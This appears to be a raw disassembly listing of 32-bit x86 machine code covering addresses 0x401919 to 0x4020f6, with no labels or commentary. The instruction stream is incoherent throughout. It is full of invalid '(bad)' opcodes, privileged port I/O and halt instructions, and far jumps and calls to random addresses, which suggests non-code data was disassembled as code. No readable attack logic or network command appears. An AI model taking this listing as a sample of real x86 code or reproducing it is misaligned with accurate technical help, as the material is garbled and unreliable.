  401919:	mov    ah,0xee
  40191b:	(bad)  
  40191c:	stos   DWORD PTR es:[edi],eax
  40191d:	inc    ebx
  40191e:	sahf   
  40191f:	push   0x4143c705
  401924:	sub    DWORD PTR [edi],0xfffffff0
  401927:	jle    0x40196a
  401929:	dec    eax
  40192a:	sub    al,BYTE PTR [esi+ebx*1]
  40192d:	out    dx,eax
  40192e:	add    al,0x5d
  401930:	mov    al,0x1
  401932:	es sahf 
  401934:	mov    eax,0x247787a6
  401939:	sub    edi,esp
  40193b:	add    DWORD PTR [eax-0x176da33],0x130eb771
  401945:	add    BYTE PTR [edx+0x38],bl
  401948:	rcr    al,0x5f
  40194b:	xchg   DWORD PTR [ebp-0x585d2774],edx
  401951:	popa   
  401952:	iret   
  401953:	out    dx,al
  401954:	jge    0x4019ad
  401956:	fisttp WORD PTR [edx]
  401958:	inc    edx
  401959:	jns    0x401978
  40195b:	xchg   edx,eax
  40195c:	cli    
  40195d:	repz daa 
  40195f:	enter  0xde6c,0xcc
  401963:	sub    al,BYTE PTR [edi+0x3b]
  401966:	sbb    BYTE PTR [esi],bl
  401968:	cmc    
  401969:	xor    eax,0x9a2c37d1
  40196e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40196f:	xor    BYTE PTR [ecx-0x587fc2af],0x1
  401976:	imul   edx,DWORD PTR ds:0x1bf12027,0xffffffcb
  40197d:	jns    0x401928
  40197f:	push   esp
  401980:	(bad)  
  401981:	pop    esi
  401982:	pop    es
  401983:	test   eax,0xf90324dc
  401988:	xor    DWORD PTR [esi-0x24d0434b],ebx
  40198e:	cmp    al,0x14
  401990:	jle    0x40191e
  401992:	jae    0x401937
  401994:	jo     0x4019f1
  401996:	xor    ebp,ebx
  401998:	dec    ebx
  401999:	repnz mov edx,0x7a379898
  40199f:	jmp    0x3abccafd
  4019a4:	je     0x4019d6
  4019a6:	jnp    0x40196a
  4019a8:	jp     0xe9f94c4d
  4019ae:	add    bh,BYTE PTR [esp+ebx*1]
  4019b1:	dec    edi
  4019b2:	bound  ebp,QWORD PTR [eax-0x7b41ec43]
  4019b8:	popa   
  4019b9:	mov    edi,0x7ec6bda4
  4019be:	mov    edi,0xb20786f
  4019c3:	sbb    eax,0xe4d3dd95
  4019c8:	adc    cl,bh
  4019ca:	(bad)  
  4019cb:	stos   BYTE PTR es:[edi],al
  4019cc:	dec    esi
  4019cd:	cs pusha 
  4019cf:	push   edi
  4019d0:	mov    ebp,0xfac47c4d
  4019d5:	lahf   
  4019d6:	pusha  
  4019d7:	daa    
  4019d8:	cwde   
  4019d9:	push   es
  4019da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019db:	adc    DWORD PTR [eax+0x231cb0b7],ecx
  4019e1:	jmp    0x503a:0x54c142ac
  4019e8:	lock or bh,BYTE PTR [eax-0x45]
  4019ec:	mov    BYTE PTR [ebx],ch
  4019ee:	dec    edx
  4019ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019f0:	dec    eax
  4019f1:	sub    edi,DWORD PTR [ecx-0x8f189b2]
  4019f7:	in     al,0x51
  4019f9:	fisttp WORD PTR [esi+0x58]
  4019fc:	cdq    
  4019fd:	stc    
  4019fe:	mov    DWORD PTR [edx+0x6bcbda54],esi
  401a04:	mov    ds:0xa8b3ed6a,al
  401a09:	(bad)
  401a0c:	shl    BYTE PTR [ebp-0x7c],1
  401a0f:	xchg   DWORD PTR [ebp+0x31],ecx
  401a12:	and    al,0x3
  401a14:	jle    0x401a2d
  401a16:	(bad)  
  401a17:	push   edi
  401a18:	and    al,dl
  401a1a:	and    eax,0x8f44077e
  401a1f:	mov    ss,WORD PTR [eax-0x2f]
  401a22:	test   BYTE PTR [ecx+0x2b],ah
  401a25:	nop
  401a26:	ins    BYTE PTR es:[edi],dx
  401a27:	adc    eax,DWORD PTR [ebx-0x70ba3e4f]
  401a2d:	mov    esp,ebp
  401a2f:	and    al,0x82
  401a31:	jnp    0x401a84
  401a33:	add    ecx,DWORD PTR [esp+esi*1+0x43]
  401a37:	push   eax
  401a38:	inc    edx
  401a39:	inc    ebx
  401a3a:	js     0x401a68
  401a3c:	mov    WORD PTR [edx-0x1dfb396d],es
  401a42:	push   ebp
  401a43:	repnz lods al,BYTE PTR ds:[esi]
  401a45:	mov    al,0x51
  401a47:	xchg   ebp,eax
  401a48:	dec    esi
  401a49:	xchg   ebp,eax
  401a4a:	test   DWORD PTR [edx+0x5e],edx
  401a4d:	dec    ebx
  401a4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a4f:	dec    ebx
  401a50:	cmp    eax,0x5c35e945
  401a55:	gs mov dl,0x43
  401a58:	test   eax,0x57675230
  401a5d:	adc    edx,DWORD PTR [edx]
  401a5f:	dec    ecx
  401a60:	hlt    
  401a61:	imul   edi,DWORD PTR [ebx],0xfffffff8
  401a64:	in     al,0xb6
  401a66:	inc    esi
  401a67:	inc    ebx
  401a68:	in     eax,dx
  401a69:	lahf   
  401a6a:	jbe    0x401a00
  401a6c:	or     al,0xa0
  401a6e:	cmp    al,0x7f
  401a71:	call   0xaaca4079
  401a76:	mov    ecx,0xf135ce57
  401a7b:	pop    edi
  401a7c:	leave  
  401a7d:	jmp    0xdceb:0x53bde6e2
  401a84:	mov    ch,0x8b
  401a86:	sbb    esp,DWORD PTR [edi-0x51]
  401a89:	out    0x72,al
  401a8b:	daa    
  401a8c:	fsub   DWORD PTR [ebx]
  401a8e:	aas    
  401a8f:	ins    BYTE PTR es:[edi],dx
  401a90:	int    0x6e
  401a92:	jns    0x401a74
  401a94:	pop    ebx
  401a95:	(bad)  
  401a96:	(bad)  
  401a97:	ficom  DWORD PTR ds:0xe3d79322
  401a9d:	daa    
  401a9e:	xchg   ecx,eax
  401a9f:	jmp    0xc6826cbf
  401aa4:	call   0xd94a15be
  401aa9:	mov    bh,0x4e
  401aab:	mov    dh,0xdc
  401aad:	and    BYTE PTR [ebx-0x357cc05f],bl
  401ab3:	mov    ecx,0xeaefd5c9
  401ab8:	fs adc al,0x26
  401abb:	dec    ebx
  401abc:	bound  ebx,QWORD PTR [eax+edi*2-0x293e44ba]
  401ac3:	jle    0x401ade
  401ac5:	push   ebx
  401ac6:	sbb    bh,cl
  401ac8:	fucomp st(0)
  401aca:	jp     0x401a66
  401acc:	das    
  401acd:	dec    esi
  401ace:	aam    0x74
  401ad0:	test   BYTE PTR [ebx+0x508b8651],al
  401ad6:	jp     0x401b4b
  401ad8:	pusha  
  401ad9:	push   0xf2309850
  401ade:	sbb    al,0xfd
  401ae0:	jl     0x401acd
  401ae2:	jae    0x401b35
  401ae4:	(bad)  [edi-0x36]
  401ae7:	or     eax,0x7628a2f
  401aec:	cs pusha 
  401aee:	retf   0xe1e1
  401af1:	pop    esp
  401af2:	leave  
  401af3:	adc    al,0xe8
  401af5:	mov    BYTE PTR [ecx],al
  401af7:	mov    esi,0xe2c9b99
  401afc:	mov    cl,0x8a
  401afe:	jb     0x401a9c
  401b00:	push   ecx
  401b01:	mov    bh,0x96
  401b03:	outs   dx,BYTE PTR ds:[esi]
  401b04:	xchg   esp,eax
  401b05:	jmp    0x72c309c3
  401b0a:	(bad)  
  401b0b:	dec    BYTE PTR [eax+0x70]
  401b0e:	dec    edx
  401b0f:	sub    ebp,DWORD PTR [ebx]
  401b11:	sti    
  401b12:	icebp  
  401b13:	(bad)  
  401b14:	and    al,0xa9
  401b16:	inc    esp
  401b17:	mov    esi,0x6e5a3927
  401b1c:	mov    esp,0xad10e522
  401b21:	retf   0x3fd3
  401b24:	mov    ds:0x3de44977,eax
  401b29:	pop    edx
  401b2a:	ss mov dh,0x64
  401b2d:	out    0xef,al
  401b2f:	ja     0x401b2d
  401b31:	jp     0x401b27
  401b33:	mov    al,0x20
  401b35:	stos   DWORD PTR es:[edi],eax
  401b36:	dec    edi
  401b37:	mov    edx,0x70f80e61
  401b3c:	push   es
  401b3d:	push   ebp
  401b3e:	jmp    0x401ad5
  401b40:	cwde   
  401b41:	cdq    
  401b42:	xchg   esi,eax
  401b43:	outs   dx,DWORD PTR ds:[esi]
  401b44:	adc    al,BYTE PTR [edi+0x402e518c]
  401b4a:	push   es
  401b4b:	xor    eax,0x2f204228
  401b50:	fcomp  DWORD PTR [eax-0x71]
  401b53:	js     0x401b6a
  401b55:	mov    ch,0x92
  401b57:	dec    esi
  401b58:	mov    ebx,0x34bae7cc
  401b5d:	cwde   
  401b5e:	retf   
  401b5f:	mov    cl,0x41
  401b61:	mov    eax,ds:0xf3998f8e
  401b66:	mov    esi,0xd7f5ea4
  401b6b:	cs scas al,BYTE PTR es:[edi]
  401b6d:	inc    eax
  401b6e:	fdiv   QWORD PTR [ebx]
  401b70:	push   esp
  401b71:	in     eax,0x77
  401b73:	xchg   ecx,eax
  401b74:	fsubr  DWORD PTR [ecx+edx*8+0x6cef4728]
  401b7b:	jno    0x401b47
  401b7d:	(bad)
  401b80:	add    eax,0xbc031c03
  401b85:	outs   dx,BYTE PTR ds:[esi]
  401b86:	in     al,0x74
  401b88:	dec    ebp
  401b89:	imul   esi,DWORD PTR [ebx+0x1c4106e3],0x48333dbb
  401b93:	xchg   ecx,eax
  401b94:	test   eax,0x85387ee1
  401b99:	sahf   
  401b9a:	daa    
  401b9b:	push   eax
  401b9c:	and    DWORD PTR [esi+0x63],ebp
  401b9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ba0:	fsub   st,st(6)
  401ba2:	test   BYTE PTR [edx+0x3b],bh
  401ba5:	pop    ebp
  401ba6:	ret    0xcbf5
  401ba9:	scas   eax,DWORD PTR es:[edi]
  401baa:	ds push ebp
  401bac:	fdiv   DWORD PTR [edi-0x18]
  401baf:	imul   ebx,DWORD PTR [ebp-0x4c],0xffffffcc
  401bb3:	mov    ebx,0x80c8ebee
  401bb8:	loope  0x401be9
  401bba:	or     bl,al
  401bbc:	call   0x8ee18a03
  401bc1:	leave  
  401bc2:	xchg   edi,eax
  401bc3:	pop    ecx
  401bc4:	out    0xcc,eax
  401bc6:	mov    al,0x1a
  401bc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bc9:	(bad)  
  401bca:	daa    
  401bcb:	dec    eax
  401bcc:	je     0x401bd7
  401bce:	jmp    0xbd724a9
  401bd3:	add    DWORD PTR [ecx+0x5f],edi
  401bd6:	sub    al,dh
  401bd8:	ins    DWORD PTR es:[edi],dx
  401bd9:	sbb    BYTE PTR [esi-0x72],ch
  401bdc:	inc    ebx
  401bdd:	xchg   DWORD PTR [edi],edx
  401bdf:	rol    esi,0x3d
  401be2:	push   eax
  401be3:	inc    ecx
  401be4:	mov    ds:0xbf391b6f,al
  401be9:	mov    al,0x81
  401beb:	jnp    0x401bd3
  401bed:	mov    eax,0xf3e8d999
  401bf2:	cmp    DWORD PTR [eax],ebp
  401bf4:	sbb    eax,edi
  401bf6:	(bad)  
  401bf7:	fdiv   st(1),st
  401bf9:	test   ebp,0x7d00ecee
  401bff:	push   es
  401c00:	jnp    0x401b8f
  401c02:	enter  0x297d,0xb8
  401c06:	call   DWORD PTR [eax+0x76]
  401c09:	adc    bl,BYTE PTR [eax-0x65746565]
  401c0f:	das    
  401c10:	inc    edx
  401c11:	sti    
  401c12:	push   esi
  401c13:	sahf   
  401c14:	xor    BYTE PTR [ebx+0x3f260c0e],0xee
  401c1b:	jnp    0x401be5
  401c1d:	and    ch,BYTE PTR ss:[ecx+0x49d7cf90]
  401c24:	rcr    bh,1
  401c26:	dec    ebx
  401c27:	imul   ebp,edi,0xffffff8b
  401c2a:	stc    
  401c2b:	or     ecx,ebx
  401c2d:	ret    0xd9f8
  401c30:	(bad)  
  401c31:	scas   eax,DWORD PTR es:[edi]
  401c32:	sub    al,0x8c
  401c34:	mov    eax,0x515a7df2
  401c39:	adc    bl,bl
  401c3b:	into   
  401c3c:	and    al,0xb5
  401c3e:	inc    edi
  401c3f:	fsub   st,st(1)
  401c41:	sti    
  401c42:	cwde   
  401c43:	retf   
  401c44:	mov    edx,edi
  401c46:	or     BYTE PTR [edi-0x52],ah
  401c49:	mov    edi,0xd6805852
  401c4e:	mov    ah,0xc4
  401c50:	sub    DWORD PTR [ecx],0x63f83038
  401c56:	fsubr  DWORD PTR ds:0xf4cbdc1b
  401c5c:	enter  0x2885,0x6d
  401c60:	and    BYTE PTR [esi+esi*4-0x61d1ca6],bl
  401c67:	cmp    BYTE PTR [eax+eiz*1],0xcf
  401c6b:	mov    ecx,0x34b4b2ac
  401c70:	sub    DWORD PTR [ecx],ebx
  401c72:	add    DWORD PTR [edi+0x25f123fc],ebp
  401c78:	add    eax,0xe1918a2
  401c7d:	das    
  401c7e:	arpl   WORD PTR [edx],di
  401c80:	popf   
  401c81:	hlt    
  401c82:	dec    ecx
  401c83:	add    BYTE PTR [esi-0x21],bl
  401c86:	popa   
  401c87:	jo     0x401ced
  401c89:	mov    DWORD PTR [edi+0x75ad9646],0x3e7a32e
  401c93:	inc    ebx
  401c94:	(bad)  
  401c95:	out    dx,eax
  401c96:	and    esp,0x1f
  401c99:	pop    ss
  401c9a:	shl    DWORD PTR [ecx],0x7c
  401c9d:	mov    al,ds:0x5d4ff319
  401ca2:	cdq    
  401ca3:	imul   edi,DWORD PTR ds:0x72498905,0x54
  401caa:	imul   edx,DWORD PTR [edx+0x6559587c],0x51988cea
  401cb4:	imul   ebp,DWORD PTR [eax+0x5c],0x86c5dcb
  401cbb:	and    BYTE PTR [ebp-0x4d3db477],ch
  401cc1:	add    dh,0xda
  401cc4:	sar    DWORD PTR [edi-0x3d3a8f4e],1
  401cca:	push   ss
  401ccb:	adc    ebp,DWORD PTR [ebp-0x74]
  401cce:	pop    ebx
  401ccf:	outs   dx,DWORD PTR ds:[esi]
  401cd0:	adc    al,0xf0
  401cd2:	jl     0x401c75
  401cd4:	fsubp  st(1),st
  401cd6:	call   0xa3c3:0xe5745cc
  401cdd:	into   
  401cde:	add    DWORD PTR [eax],esp
  401ce0:	jb     0x401ccb
  401ce2:	pop    ebx
  401ce3:	pop    esp
  401ce4:	adc    eax,0x238e957e
  401ce9:	lds    esi,FWORD PTR [edi+0x2c3eff41]
  401cef:	bound  ebx,QWORD PTR [edx+0x59]
  401cf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401cf3:	jns    0x401d2c
  401cf5:	cmc    
  401cf6:	xchg   esp,eax
  401cf7:	lock imul esp,DWORD PTR es:[ebx+0x35],0x4b
  401cfd:	or     DWORD PTR [eax],edi
  401cff:	xchg   esp,eax
  401d00:	jne    0x401cf5
  401d02:	sbb    edi,DWORD PTR [edx+0x27]
  401d05:	jl     0x401cd0
  401d07:	shl    DWORD PTR [edx],1
  401d09:	fld    TBYTE PTR [ebp-0x4c]
  401d0c:	push   cs
  401d0d:	data16 jnp 0x401cd5
  401d10:	sahf   
  401d11:	arpl   WORD PTR [esi+0x591c3f96],cx
  401d17:	jmp    0x401cb7
  401d19:	test   DWORD PTR [edi],ecx
  401d1b:	das    
  401d1c:	lods   al,BYTE PTR ds:[esi]
  401d1d:	call   0x4bc:0x9b5a69e4
  401d24:	paddsw mm4,mm5
  401d27:	xlat   BYTE PTR ds:[ebx]
  401d28:	sbb    bh,0x65
  401d2b:	fist   WORD PTR [ebx+0x4b]
  401d2e:	xlat   BYTE PTR ds:[ebx]
  401d2f:	loop   0x401cde
  401d31:	xor    al,BYTE PTR [edi+0x5c0dae94]
  401d37:	sbb    ebp,DWORD PTR [esi]
  401d39:	add    bl,ch
  401d3b:	dec    ecx
  401d3c:	adc    al,0xd3
  401d3e:	push   0x77cb15cd
  401d43:	xlat   BYTE PTR ds:[ebx]
  401d44:	adc    ch,BYTE PTR [ebx]
  401d46:	in     al,dx
  401d47:	cli    
  401d48:	(bad)  
  401d49:	fimul  WORD PTR [ebx+0x40]
  401d4c:	mov    ds:0x346745a3,eax
  401d51:	push   edx
  401d52:	add    DWORD PTR [esi-0x3c],eax
  401d55:	jmp    0x401dc1
  401d57:	out    dx,eax
  401d58:	jno    0x401d3e
  401d5a:	dec    ecx
  401d5b:	jecxz  0x401d31
  401d5d:	pop    ss
  401d5e:	aas    
  401d5f:	push   edi
  401d60:	test   eax,0xff9042e3
  401d65:	aas    
  401d66:	push   edx
  401d67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d68:	dec    ecx
  401d69:	cmc    
  401d6a:	inc    edi
  401d6b:	jns    0x401cf1
  401d6d:	je     0x401cf1
  401d6f:	sub    al,0x31
  401d71:	icebp  
  401d72:	mov    ds:0x713d889b,eax
  401d77:	seto   BYTE PTR [ebx-0xf7424c2]
  401d7e:	jae    0x401dae
  401d80:	and    eax,0xdf0e6729
  401d85:	mov    dh,0x2e
  401d87:	xor    edx,0x3e
  401d8a:	mov    al,0x95
  401d8c:	std    
  401d8d:	push   es
  401d8e:	ins    WORD PTR es:[edi],dx
  401d90:	sub    eax,0xd8e8e9a8
  401d95:	jmp    0x5254b733
  401d9a:	test   BYTE PTR [esi-0x14744fb1],ch
  401da0:	imul   esi,DWORD PTR [edx+0x595ab330],0x1fe4ebed
  401daa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401dab:	mov    edx,0xc1826536
  401db0:	cwde   
  401db1:	outs   dx,DWORD PTR ds:[esi]
  401db2:	outs   dx,DWORD PTR ds:[esi]
  401db3:	mov    bh,0x55
  401db5:	fldcw  WORD PTR ds:0x53ee3fb4
  401dbb:	sbb    ebx,DWORD PTR [ebx+0x6c]
  401dbe:	std    
  401dbf:	scas   eax,DWORD PTR es:[edi]
  401dc0:	lea    ebp,[ecx-0x387aa19d]
  401dc6:	cmp    eax,0xe019eea5
  401dcb:	test   bl,dh
  401dcd:	dec    edi
  401dce:	outs   dx,DWORD PTR ds:[esi]
  401dcf:	icebp  
  401dd0:	push   eax
  401dd1:	mov    al,ds:0x8cb998b3
  401dd6:	sbb    ebx,DWORD PTR [edx-0x441ffb63]
  401ddc:	push   eax
  401ddd:	cmp    al,ah
  401ddf:	out    dx,al
  401de0:	push   ecx
  401de1:	push   ss
  401de2:	mov    BYTE PTR [ecx],dh
  401de4:	in     al,dx
  401de5:	pusha  
  401de6:	ss out dx,al
  401de8:	scas   eax,DWORD PTR es:[edi]
  401de9:	mov    cl,0xda
  401deb:	lods   al,BYTE PTR ds:[esi]
  401dec:	jecxz  0x401e4c
  401dee:	sbb    al,0x53
  401df0:	fwait
  401df1:	jmp    0xb282d2be
  401df6:	vaddss xmm7,xmm7,DWORD PTR [eax-0x2]
  401dfb:	pop    edi
  401dfc:	mov    ds:0x9de93b1f,eax
  401e01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e02:	jnp    0x401e6a
  401e04:	cli    
  401e05:	xchg   ecx,eax
  401e06:	dec    ebx
  401e07:	mov    ch,0xef
  401e09:	out    0x12,al
  401e0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e0c:	adc    eax,0x938403fc
  401e11:	xor    BYTE PTR [edi-0x29],ch
  401e14:	jne    0x401dd9
  401e16:	in     eax,0xc0
  401e18:	mov    esi,0x9fe6584
  401e1d:	and    DWORD PTR [esi+edi*4-0x78],0x3e
  401e22:	ret    
  401e23:	or     BYTE PTR [esi-0x75],cl
  401e26:	mov    ebx,0x8fdd8bed
  401e2b:	int3   
  401e2c:	or     BYTE PTR [edi-0x5b],bh
  401e2f:	pop    edi
  401e30:	nop
  401e31:	pop    es
  401e32:	lds    edi,FWORD PTR [ecx+0x5f]
  401e35:	sub    BYTE PTR [ebp-0x16177349],0xf1
  401e3c:	or     edx,DWORD PTR ds:0x924d2ad3
  401e42:	in     al,0x0
  401e44:	xor    ecx,0x1a
  401e47:	dec    edx
  401e48:	clc    
  401e49:	or     DWORD PTR [ebp+0x3d164dc4],esp
  401e4f:	and    DWORD PTR [ecx+0x4c],esp
  401e52:	js     0x401e4b
  401e54:	fdivp  st(5),st
  401e56:	push   edx
  401e57:	enter  0x9f73,0xb9
  401e5b:	les    edi,FWORD PTR [edi-0xa]
  401e5e:	pop    esp
  401e5f:	fisttp DWORD PTR [ebp+0x775a8aae]
  401e65:	mov    esp,0x30d15208
  401e6a:	ins    DWORD PTR es:[edi],dx
  401e6b:	fisub  WORD PTR [edx-0x4a]
  401e6e:	les    ebx,FWORD PTR [eax+0x19340b36]
  401e74:	sub    al,dh
  401e76:	in     al,dx
  401e77:	sti    
  401e78:	add    esi,DWORD PTR [ecx-0x2]
  401e7b:	stc    
  401e7c:	fild   DWORD PTR [ebp-0x39fdb4e]
  401e82:	imul   esi,DWORD PTR [eax+0x6e],0x1e
  401e86:	mov    eax,0x56152e96
  401e8b:	cmp    edx,DWORD PTR [eax+0x591563bb]
  401e91:	not    BYTE PTR [edi]
  401e93:	xor    al,0xda
  401e95:	mov    eax,0x63ec6807
  401e9a:	sub    BYTE PTR [ebx+0x1f],dl
  401e9d:	daa    
  401e9e:	aam    0xd8
  401ea0:	or     eax,0x4292a086
  401ea5:	adc    DWORD PTR [ebx],esi
  401ea7:	jle    0x401e88
  401ea9:	pop    ebp
  401eaa:	add    cl,BYTE PTR [edx+0x6d0d6830]
  401eb0:	popf   
  401eb1:	hlt    
  401eb2:	xor    eax,0x25f0f192
  401eb7:	push   0xe
  401eb9:	jp     0x175530a4
  401ebf:	adc    ebx,DWORD PTR [ecx+0x44946d18]
  401ec5:	call   0xdabb:0x6010ef07
  401ecc:	or     BYTE PTR [esi-0x26],bl
  401ecf:	sub    DWORD PTR [edi],0x9ee3c515
  401ed5:	adc    BYTE PTR [esi+0x53],dl
  401ed8:	jo     0x401f1b
  401eda:	sets   dh
  401edd:	cmp    al,bh
  401edf:	int    0x31
  401ee1:	dec    ebp
  401ee2:	dec    ecx
  401ee3:	shr    DWORD PTR [edi+ebp*8],0x21
  401ee7:	imul   ecx,DWORD PTR [edi-0x5f],0x78183711
  401eee:	and    BYTE PTR ds:0xf5bae736,0xb9
  401ef5:	xchg   DWORD PTR [eax+eiz*4],esp
  401ef8:	sub    DWORD PTR [ecx+ecx*1],esi
  401efb:	gs inc ebx
  401efd:	jle    0x401f38
  401eff:	inc    esp
  401f00:	push   eax
  401f01:	shr    BYTE PTR [esi+0x70],1
  401f04:	out    dx,al
  401f05:	push   edi
  401f06:	jge    0x401f38
  401f08:	pop    esi
  401f09:	pop    ecx
  401f0a:	fdivr  DWORD PTR [eax-0x2a]
  401f0d:	and    al,0xda
  401f0f:	shl    BYTE PTR [esi],0xbd
  401f12:	repnz inc edi
  401f14:	sub    ebx,DWORD PTR [edx-0x2ce3f7e1]
  401f1a:	mov    ecx,0x8f4fec50
  401f1f:	cli    
  401f20:	(bad)  
  401f21:	aaa    
  401f22:	mov    cs,WORD PTR [ecx+0x6e]
  401f25:	add    ah,0xfd
  401f28:	jne    0x401f21
  401f2a:	aas    
  401f2b:	stos   DWORD PTR es:[edi],eax
  401f2c:	jne    0x401f40
  401f2e:	out    0x8d,eax
  401f30:	lea    eax,[ebp+0x6a]
  401f33:	cld    
  401f34:	mov    ds:0x7f13cd8,eax
  401f39:	pop    eax
  401f3a:	daa    
  401f3b:	popa   
  401f3c:	sbb    bl,0xd4
  401f3f:	ins    BYTE PTR es:[edi],dx
  401f40:	test   eax,0x2741ec65
  401f45:	mov    bl,BYTE PTR [ebp-0x760ca084]
  401f4b:	push   es
  401f4c:	mov    al,0xc9
  401f4e:	lods   al,BYTE PTR ds:[esi]
  401f4f:	mov    al,ds:0x3a97850b
  401f54:	pushf  
  401f55:	cli    
  401f56:	sub    DWORD PTR [edi],ebx
  401f58:	sti    
  401f59:	inc    ecx
  401f5a:	ds mov ah,0xfa
  401f5d:	stc    
  401f5e:	in     al,dx
  401f5f:	jnp    0x401f53
  401f61:	and    eax,0x92a34fea
  401f66:	jl     0x401f48
  401f68:	pop    ds
  401f69:	push   0x13ae0938
  401f6e:	jecxz  0x401f19
  401f70:	mov    ds:0x662d602d,al
  401f75:	adc    ch,BYTE PTR [edi+eiz*1-0x32]
  401f79:	cmc    
  401f7a:	sub    DWORD PTR [eax+0x46],0xd1506415
  401f81:	mov    dl,0xa8
  401f83:	mov    ds:0x12a56108,al
  401f88:	adc    al,0xee
  401f8a:	inc    esi
  401f8b:	jmp    0x402001
  401f8d:	mov    bh,0x56
  401f8f:	mov    esi,0xc11852c9
  401f94:	(bad)  
  401f96:	pop    ebp
  401f97:	xchg   edx,eax
  401f98:	jge    0x401fb4
  401f9a:	mov    esi,0x749bc4d6
  401f9f:	push   esi
  401fa0:	xchg   ecx,eax
  401fa1:	inc    esp
  401fa2:	ror    DWORD PTR ds:0xb2fcd59c,0x93
  401fa9:	sub    eax,0x42ad3d5d
  401fae:	mov    ds:0xdd1fccaa,al
  401fb3:	adc    al,0x15
  401fb5:	or     BYTE PTR [edi+0x72c2798f],0xa3
  401fbc:	in     eax,dx
  401fbd:	ret    
  401fbe:	jo     0x401f9c
  401fc0:	and    esp,ebx
  401fc2:	loope  0x40200f
  401fc4:	mov    bl,0xf8
  401fc6:	sub    edx,DWORD PTR [edi-0x7c]
  401fc9:	pop    ecx
  401fca:	mov    bl,0xab
  401fcc:	call   0xe442:0x898f4587
  401fd3:	sbb    DWORD PTR [ebx],edx
  401fd5:	inc    ecx
  401fd6:	add    dh,cl
  401fd8:	retf   0x8dfc
  401fdb:	push   cs
  401fdc:	ror    DWORD PTR [edi-0x11],cl
  401fdf:	sub    cl,0xb9
  401fe2:	rcl    BYTE PTR [eax+eax*8+0x38],0xac
  401fe7:	mov    bl,BYTE PTR [edx-0x3023bf2]
  401fed:	fdivp  st(2),st
  401fef:	sub    BYTE PTR [edx+0x2e],0xcc
  401ff3:	bound  edx,QWORD PTR [eax+0x58]
  401ff6:	lock dec ebx
  401ff8:	out    dx,eax
  401ff9:	jns    0x402067
  401ffb:	xor    eax,0x2cb05ed
  402000:	cmp    esi,DWORD PTR [edx]
  402002:	imul   esp,DWORD PTR [edi+0x19ff9ed6],0xa1304400
  40200c:	je     0x402063
  40200e:	ror    DWORD PTR [ecx+0x5f],cl
  402011:	ret    
  402012:	fsubr  DWORD PTR [edx]
  402014:	jmp    0x401ff3
  402016:	pop    eax
  402017:	cmp    al,BYTE PTR [edi]
  402019:	cmp    bl,BYTE PTR [ecx+edx*1]
  40201c:	mov    eax,0xb661ae14
  402021:	lock repnz mov bl,dl
  402025:	jecxz  0x401fdc
  402027:	push   esi
  402028:	in     al,dx
  402029:	sar    BYTE PTR [esi-0xf9f05b2],0xb3
  402030:	std    
  402031:	mov    dl,0xe
  402033:	test   BYTE PTR [esi+0x4b],ah
  402036:	ins    BYTE PTR es:[edi],dx
  402037:	push   edi
  402038:	(bad)  
  402039:	(bad)  
  40203a:	fimul  WORD PTR [ebp+0x2a30ff88]
  402040:	sub    edi,DWORD PTR [eax-0x4b4d0747]
  402046:	sahf   
  402047:	push   cs
  402048:	xor    DWORD PTR [eax+0x2a],ecx
  40204b:	inc    ebx
  40204c:	das    
  40204d:	mov    ds:0x4167de9a,al
  402052:	adc    al,0x77
  402054:	push   esp
  402055:	pop    esi
  402056:	repz test BYTE PTR [ebx+0x36152722],bh
  40205d:	cmc    
  40205e:	jnp    0x402089
  402060:	scas   al,BYTE PTR es:[edi]
  402061:	or     DWORD PTR [edx],ebp
  402063:	or     al,0x20
  402065:	add    ebx,DWORD PTR [edx]
  402067:	mov    al,ds:0x6d979924
  40206c:	jne    0x40201d
  40206e:	xchg   edx,eax
  40206f:	das    
  402070:	jge    0x402078
  402072:	mov    cl,0x1
  402074:	cwde   
  402075:	icebp  
  402076:	mov    al,0xcc
  402078:	jge    0x4020bc
  40207a:	fcmove st,st(4)
  40207c:	cmp    al,0xd8
  40207e:	popa   
  40207f:	(bad)  
  402080:	mov    dl,al
  402082:	sbb    BYTE PTR [edx],ah
  402084:	xchg   edx,eax
  402085:	fwait
  402086:	cli    
  402087:	push   ebp
  402088:	mov    eax,ds:0x44c7897b
  40208d:	push   ecx
  40208e:	xor    al,0x4a
  402090:	fwait
  402091:	je     0x4020ec
  402093:	jbe    0x402028
  402095:	adc    BYTE PTR [ecx+0x71],0xce
  402099:	shl    ah,0xbd
  40209c:	mov    ebp,0x53439bfe
  4020a1:	stc    
  4020a2:	shr    cl,cl
  4020a4:	aad    0x27
  4020a6:	aam    0x6c
  4020a8:	inc    edi
  4020a9:	out    dx,al
  4020aa:	xor    dl,BYTE PTR [eax+0xc58e3a1]
  4020b0:	sbb    ah,BYTE PTR [edi+0x74]
  4020b3:	mov    WORD PTR [edx-0x698b7eb8],ds
  4020b9:	sahf   
  4020ba:	add    eax,0x90686d6b
  4020bf:	sub    BYTE PTR [ecx],ah
  4020c1:	jno    0x402119
  4020c3:	stc    
  4020c4:	jg     0x402079
  4020c6:	stos   DWORD PTR es:[edi],eax
  4020c7:	popf   
  4020c8:	int    0xb6
  4020ca:	cmp    DWORD PTR [edi-0x21],ebp
  4020cd:	pop    esp
  4020ce:	inc    ebx
  4020cf:	jns    0x402107
  4020d1:	stos   DWORD PTR es:[edi],eax
  4020d2:	rcr    DWORD PTR [ebx-0x72],cl
  4020d5:	jl     0x4020e5
  4020d7:	sub    ecx,ecx
  4020d9:	lods   eax,DWORD PTR ds:[esi]
  4020da:	scas   al,BYTE PTR es:[edi]
  4020db:	inc    ebx
  4020dc:	mov    ebx,DWORD PTR [edi-0x14]
  4020df:	and    ah,dh
  4020e1:	jmp    0x3c82:0x4e936397
  4020e8:	xchg   BYTE PTR [edx+ebp*8+0x26],dl
  4020ec:	je     0x4020a9
  4020ee:	sbb    eax,0xc60c1644
  4020f3:	xchg   ebp,eax
  4020f4:	jl     0x4020ef
  4020f6:	ins    BYTE PTR es:[edi],dx
